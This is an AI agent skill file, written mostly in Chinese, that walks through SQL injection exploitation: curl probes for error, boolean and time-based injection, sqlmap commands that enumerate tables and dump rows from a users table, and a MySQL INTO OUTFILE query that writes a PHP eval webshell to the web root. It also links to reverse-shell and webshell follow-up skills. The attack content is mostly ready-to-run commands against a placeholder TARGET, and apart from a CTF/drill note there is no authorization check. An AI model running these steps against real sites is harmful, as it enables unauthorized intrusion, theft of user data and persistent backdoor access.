---
name: sqli-testing
description: >-
  Tests SQL injection on web parameters with sqlmap and manual boolean/time/error
  probes; exports proof queries and DB fingerprints to runs/. Use in exploit or
  vuln-scan when user mentions SQL/SQLi/注入/sqlmap/union/select/数据库报错.
whenToUse: 发现带参数 URL/POST/JSON 接口，或响应含 SQL 语法错误、布尔差异、延迟差异
role: exploit
enabled: true
---

# SQL 注入测试（sqlmap + 手工验证）

Web 渗透最高频漏洞之一。本技能：**先证注入存在 → 再定类型 → 再取数/写 shell**，每步留 `runs/` 证据。

## 何时用 / 何时不用

| 用 | 不用 |
|---|---|
| `?id=` / search / login 等动态参数 | 纯静态页、无参数接口 |
| nuclei/扫描器报 SQLi | 已确认 WAF 全拦且未配 `cn-proxy-pool` |
| CTF Web 题 | 二进制逆向（→ `binary-reverse`） |

## 前置条件

- 目标 URL + 参数名（缺则用 `TARGET`/`PARAM` 占位符）
- `sqlmap` 在 PATH；WAF 强时先 `cn-proxy-pool`
- Cookie/Token 从浏览器或 `browser-automation` 导出

## 标准流程

### 1. 手工探针（快，定方向）

```bash
mkdir -p runs/sqli-TARGET
# 报错型
curl -s "http://TARGET/page?id=1'" -o runs/sqli-TARGET/error.txt
# 布尔型（对比 true/false 响应长度或关键字）
curl -s "http://TARGET/page?id=1 AND 1=1" -o runs/sqli-TARGET/true.txt
curl -s "http://TARGET/page?id=1 AND 1=2" -o runs/sqli-TARGET/false.txt
# 时间型（sleep 5，看响应时间）
curl -s -w "%{time_total}\n" "http://TARGET/page?id=1 AND SLEEP(5)-- -" -o /dev/null
diff runs/sqli-TARGET/true.txt runs/sqli-TARGET/false.txt | head
```

### 2. sqlmap 自动化

```bash
# GET
sqlmap -u "http://TARGET/page?id=1" --batch --level=3 --risk=2 \
  --random-agent --output-dir=runs/sqli-TARGET/sqlmap

# POST（表单）
sqlmap -u "http://TARGET/login" --data="user=admin&pass=1" --batch \
  --output-dir=runs/sqli-TARGET/sqlmap

# 带 Cookie
sqlmap -u "http://TARGET/api?id=1" --cookie="SESSION=xxx" --batch \
  --output-dir=runs/sqli-TARGET/sqlmap

# 枚举库表（确认注入后）
sqlmap -u "http://TARGET/page?id=1" --batch -D dbname --tables
sqlmap -u "http://TARGET/page?id=1" --batch -D dbname -T users --dump --start=1 --stop=5
```

### 3. 写 WebShell（仅 MySQL + 有 FILE 权限 + 知 web 根）

```sql
-- sqlmap --os-shell 或手工 INTO OUTFILE（路径依环境）
SELECT '<?php @eval($_POST["c"]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

成功后 → `webshell-toolkit` 实测连接。

## 与其它技能的分工

| 场景 | 技能 |
|---|---|
| 目录找后台/login | `dir-bruteforce` |
| WAF 403/封 IP | `cn-proxy-pool` |
| 拿 shell 后 | `webshell-toolkit` / `vps-reverse-shell` |
| API JSON 注入 | `api-security` |

## 输出与落库

1. `redteam_vuln_add` — type=`sqli`, url, param, evidence=`runs/sqli-TARGET/…`
2. `redteam_chain_add` — tool=完整 sqlmap/curl 命令, result=DB 版本/库名/样例行

## 纪律

1. `--dump` 只取证明所需最小行数（CTF/演练）
2. 禁止编造 DB 名/表名；未跑到标 `NOT RUN`
3. 登录口 SQLi 优先测 **绕过认证**（`auth-bypass` 可并行）
